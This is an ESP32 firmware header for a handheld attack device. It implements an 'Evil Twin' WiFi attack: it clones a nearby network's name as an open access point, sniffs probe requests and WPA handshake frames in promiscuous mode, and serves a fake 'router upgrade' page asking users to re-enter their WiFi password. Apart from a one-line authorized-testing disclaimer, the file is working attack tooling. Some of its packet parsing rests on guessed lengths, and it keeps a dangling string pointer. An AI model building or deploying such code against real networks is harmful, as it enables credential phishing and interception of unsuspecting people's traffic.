/*
 * ─────────────────────────────────────────────────────────
 * GOATI : Evil Twin WiFi attack
 *
 * Replaces the BLE Spam page (page 4).  Workflow:
 *   1. Scan nearby WiFi networks (WiFi.scanNetworks)
 *   2. Display the list on the OLED, scroll with PRG
 *   3. Long-press on the Evil Twin page: select current network,
 *      start a softAP with the same SSID (configurable clone name
 *      via the 'evil twin name' shell command)
 *   4. Every authentication attempt (probe, assoc, EAPOL) is logged
 *      to the OLED in real time as well as the serial console
 *
 * The attack surface is the live capture of WPA 4-way handshakes
 * and the deauth / dissociation-free approach of an evil twin.
 *
 * INTENDED FOR AUTHORIZED SECURITY TESTING ONLY.
 * ─────────────────────────────────────────────────────────
 */

#pragma once

#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include "display.h"

// ─── State ──────────────────────────────────────────────────────────────
static int16_t    g_et_scan_n        = 0;     // number of networks found
static int16_t    g_et_selected     = -1;    // currently selected network index
static int16_t    g_et_attempt_count = 0;    // total auth attempts captured
static char       g_et_clone_ssid[33] = "";   // configurable clone name
static char       g_et_last_event[64] = "";   // last auth attempt line
static bool       g_et_running       = false;
static WebServer  g_et_web(80);

// ─── Scan ────────────────────────────────────────────────────────────────
static void evil_twin_scan() {
  Serial.println("[EvilTwin] scanning WiFi...");
  g_et_scan_n = WiFi.scanNetworks(/*async=*/false, /*show_hidden=*/true);
  Serial.printf("[EvilTwin] %d networks found\n", g_et_scan_n);
  for (int16_t i = 0; i < g_et_scan_n; ++i) {
    Serial.printf("  [%d] %s  ch=%d  rssi=%d  %s\n",
                  i, WiFi.SSID(i).c_str(), WiFi.channel(i),
                  WiFi.RSSI(i),
                  (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "ENC");
  }
  g_et_selected = (g_et_scan_n > 0) ? 0 : -1;
}

// ─── Auth attempt capture ────────────────────────────────────────────────
// The ESP32's promiscuous mode receives raw frames; we filter for
// EAPOL (0x888e) = WPA handshake, and probe requests (type 0x04 subtype 0x04).
// ESP-IDF signature: void cb(void* buf, wifi_promiscuous_pkt_type_t type)
static void evil_twin_promiscuous_cb(void* buf_v, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  uint8_t* buf = (uint8_t*)buf_v;
  uint16_t len = 0;
  if (type == WIFI_PKT_MGMT) {
    // mgmt frames: payload layout starts at the 802.11 header (24 bytes)
    // followed by body. The full packet length is in the rx_ctrl field but
    // we don't have it; we just walk forward through body.
    len = 256;  // safe upper bound
  } else {
    // data frames: 802.11 hdr (24) + LLC (8) + payload; we have ctrl +
    // 802.11 hdr + body.  We do not have direct len here; conservative.
    len = 1024;
  }
  if (!buf) return;
  // Frame type/subtype: byte 0 (low nibble = type, high nibble = subtype)
  uint8_t fc = buf[0];
  uint8_t ftype = fc & 0x0F;
  uint8_t fsub  = (fc >> 4) & 0x0F;
  // Management frames (type 0) probe request subtype 4
  if (ftype == 0 && fsub == 4) {
    // Extract SSID from tagged parameters (offset 24 + tag hdr)
    if (len > 26) {
      uint8_t tag = buf[24];
      if (tag == 0) {  // SSID parameter set
        uint8_t slen = buf[25];
        if (slen > 0 && slen <= 32 && 26 + slen <= (uint16_t)len) {
          char ssid[33] = {0};
          memcpy(ssid, &buf[26], slen);
          g_et_attempt_count++;
          snprintf(g_et_last_event, sizeof(g_et_last_event),
                   "#%d probe: %s", g_et_attempt_count, ssid);
          Serial.printf("[EvilTwin] probe #%d for ssid '%s'\n",
                        g_et_attempt_count, ssid);
        }
      }
    }
    return;
  }
  // Data frames (type 2) with EAPOL (0x888e at bytes 30-31)
  if (ftype == 2 && len >= 34) {
    if (buf[30] == 0x88 && buf[31] == 0x8e) {
      uint8_t eapol_type = buf[34];
      const char* names[] = {"", "EAPOL-Start", "EAPOL-Key", "EAPOL-Key"};
      if (eapol_type < 4) {
        g_et_attempt_count++;
        snprintf(g_et_last_event, sizeof(g_et_last_event),
                 "#%d %s", g_et_attempt_count, names[eapol_type]);
        Serial.printf("[EvilTwin] captured %s (#%d)\n",
                      names[eapol_type], g_et_attempt_count);
      }
    }
  }
}

// ─── Lifecycle ────────────────────────────────────────────────────────
static void evil_twin_start() {
  if (g_et_selected < 0 || g_et_selected >= g_et_scan_n) {
    Serial.println("[EvilTwin] no network selected");
    return;
  }
  String orig = WiFi.SSID(g_et_selected);
  // If user configured a custom name, use it; otherwise clone
  String ssid = g_et_clone_ssid[0] ? String(g_et_clone_ssid) : orig;
  // Make a stable copy for the lambda capture
  const char* ssid_cstr = ssid.c_str();
  Serial.printf("[EvilTwin] starting AP '%s' (clone of '%s', ch=%d)\n",
                ssid.c_str(), orig.c_str(), WiFi.channel(g_et_selected));
  // Disconnect from any existing connection first (we are scanning)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid.c_str(), /*open*/"", /*channel*/WiFi.channel(g_et_selected),
              /*ssid_hidden*/0, /*max_conn*/8);
  // Promiscuous mode: capture auth attempts.  Uses the esp_wifi_set_promiscuous
  // API because the higher-level WiFi.promiscuousEnable() doesn't exist on
  // the arduino-esp32 v2.x WiFi class.
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&evil_twin_promiscuous_cb);
  g_et_running = true;
  g_et_attempt_count = 0;
  g_et_last_event[0] = '\0';
  // Register a tiny web server that serves a fake "router upgrade" page so
  // users who connect get prompted for the WPA password (classic evil-twin
  // capture technique)
  g_et_web.on("/", HTTP_GET, [ssid_cstr]() {
    String html = String("<html><body style='font-family:sans-serif;max-width:420px;margin:2em auto'>"
                        "<h2>") + ssid_cstr + "</h2>"
                        "<p>This router is being upgraded. Please reconnect and re-enter your "
                        "WiFi password when prompted.</p></body></html>";
    g_et_web.send(200, "text/html", html);
  });
  g_et_web.begin();
}

static void evil_twin_stop() {
  if (!g_et_running) return;
  esp_wifi_set_promiscuous(false);
  g_et_web.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  g_et_running = false;
  Serial.println("[EvilTwin] stopped");
}

static void evil_twin_loop() {
  if (!g_et_running) return;
  g_et_web.handleClient();
}

static uint16_t evil_twin_count() { return (uint16_t)g_et_scan_n; }
static int16_t  evil_twin_selected() { return g_et_selected; }
static void     evil_twin_set_selected(int16_t i) {
  if (g_et_scan_n > 0) g_et_selected = i % g_et_scan_n;
}
static const char* evil_twin_name(int16_t i) {
  if (i < 0 || i >= g_et_scan_n) return "";
  return WiFi.SSID(i).c_str();
}
static int8_t evil_twin_rssi(int16_t i) { return (int8_t)WiFi.RSSI(i); }
static uint8_t evil_twin_channel(int16_t i) { return (uint8_t)WiFi.channel(i); }
static bool evil_twin_is_open(int16_t i) {
  return WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
}
static bool evil_twin_running() { return g_et_running; }
static const char* evil_twin_clone_name() { return g_et_clone_ssid; }
static void evil_twin_set_clone_name(const char* n) {
  strncpy(g_et_clone_ssid, n, sizeof(g_et_clone_ssid) - 1);
  g_et_clone_ssid[sizeof(g_et_clone_ssid) - 1] = '\0';
}
static const char* evil_twin_last_event() { return g_et_last_event; }
static uint32_t evil_twin_attempt_count() { return (uint32_t)g_et_attempt_count; }
